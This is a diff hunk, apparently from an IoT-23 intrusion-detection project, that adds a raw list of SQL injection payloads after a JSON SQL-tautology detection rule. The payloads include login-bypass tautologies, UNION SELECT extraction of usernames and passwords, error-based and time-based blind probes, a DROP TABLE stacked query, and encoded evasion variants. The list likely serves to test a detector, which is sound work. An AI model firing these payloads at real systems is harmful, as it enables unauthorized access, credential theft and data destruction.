@@ -66,3 +66,47 @@ Bộ dữ liệu IOT 23
         "severity": "high",
         "message": "[SQLi-C] SQL Tautology detected (e.g., 1=1, 'x='x', OR TRUE)"
     },
+
+login
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR "1"="1
+') OR ('1'='1
+login
+admin'--
+admin' #
+admin'/*
+' OR 1=1-- -
+' OR 1=1#
+' OR 1=1/*
+
+' UNION SELECT NULL--
+' UNION SELECT 1,2--
+' UNION SELECT 1,username,password FROM users--
+' UNION ALL SELECT NULL,NULL--
+
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,user()),1)--
+
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+
+' AND SLEEP(5)--
+' OR IF(1=1,SLEEP(5),0)--
+
+'; SELECT 1--
+'; SELECT version()--
+'; DROP TABLE test--
+' OR ''='
+' OR 1=1 LIMIT 1--
+admin' OR 1=1--
+'/**/OR/**/1=1--
+%27%20OR%201%3D1--
+%2527%2520OR%25201%253D1--
+' OR '1'+'1'='11
+' OR CONCAT('1','1')='11
+' OR CHAR(49)=CHAR(49)
